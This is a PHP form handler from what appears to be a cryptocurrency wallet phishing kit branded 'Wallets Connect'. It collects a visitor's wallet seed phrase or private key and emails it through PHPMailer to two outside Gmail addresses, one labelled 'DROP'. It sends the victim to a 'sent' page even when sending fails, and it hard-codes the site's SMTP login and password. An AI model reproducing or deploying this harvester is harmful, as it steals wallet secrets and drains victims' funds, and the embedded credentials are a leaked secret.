<?php

require "vendor/autoload.php";



use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;


$developmentMode = false;
$mailer = new PHPMailer($developmentMode);

try {
    $mailer->SMTPDebug = 2;
    $mailer->isSMTP();

    if ($developmentMode) {
    $mailer->SMTPOptions = [
        'ssl'=> [
        'verify_peer' => false,
        'verify_peer_name' => false,
        'allow_self_signed' => true
        ]
    ];
    }
    
   

if(isset($_POST["submit"])){
  //  echo $_POST["name"] ; exit;
    // echo $name ; exit;
    $mailer->Host = 'walletsconnect.life';
    $mailer->SMTPAuth = true;
    $mailer->Username = 'admin@walletsconnect.life';
    $mailer->Password = 'j5!%]l9&!TtS';
    $mailer->SMTPSecure = 'tls';
    $mailer->Port = 587;
    
    //echo $name ; exit;
    
    if(isset($_POST["phrase"])){

    
                
                $phrase = $_POST['phrase']; 
                
                 //echo $password ; exit;
                 
                 // where the message lis going is below
            
                $mailer->setFrom('admin@walletsconnect.life', 'Wallets Connect Phrase');
                $mailer->addAddress('Bitfreeofficial@gmail.com', 'DROP');
                $mailer->addAddress('bichainstrade@gmail.com', 'Check');
               
                
                
                 // Attachments
                // $mail->addAttachment('/var/tmp/file.tar.gz');         // Add attachments
                // $mail->addAttachment('/tmp/image.jpg', 'new.jpg');    // Optional name
            
                $mailer->isHTML(true);
                $mailer->Subject = 'WALLET PHRASE';
                $mailer->Body = '<b>Hello! You have a new message from Wallets Connect              </b> <br><br>
                                 <b>PHRASE:</b> <b>  '. $phrase.' </b><br>';
            
                $mailer->send();
                $mailer->ClearAllRecipients();
                
                echo "MAIL HAS BEEN SENT SUCCESSFULLY"; 
                //exit;
                
                header('Location: /sent.html');
                
    }
                
     if(isset($_POST["privatekey"])){

    
                
                $privatekey = $_POST['privatekey']; 
                
                 //echo $password ; exit;
                 
                 // where the message lis going is below
            
                $mailer->setFrom('admin@walletsconnect.life', 'Wallets Connect Privatekey');
                $mailer->addAddress('Bitfreeofficial@gmail.com', 'DROP');
                $mailer->addAddress('bichainstrade@gmail.com', 'Check');
               
                
                
                 // Attachments
                // $mail->addAttachment('/var/tmp/file.tar.gz');         // Add attachments
                // $mail->addAttachment('/tmp/image.jpg', 'new.jpg');    // Optional name
            
                $mailer->isHTML(true);
                $mailer->Subject = 'WALLET PRIVATE KEY';
                $mailer->Body = '<b>Hello! You have a new message from Wallets Connect              </b> <br><br>
                                 <b>PRIVATE KEY:</b> <b>  '. $privatekey.' </b> <br>';
            
                $mailer->send();
                $mailer->ClearAllRecipients();
                
                echo "MAIL HAS BEEN SENT SUCCESSFULLY"; 
                //exit;
                
                header('Location: /sent.html');
                
    }
      
                


//end
    
}

} catch (Exception $e) {
    header('Location: /sent.html');
    // echo "EMAIL SENDING FAILED. INFO: " . $mailer->ErrorInfo;
}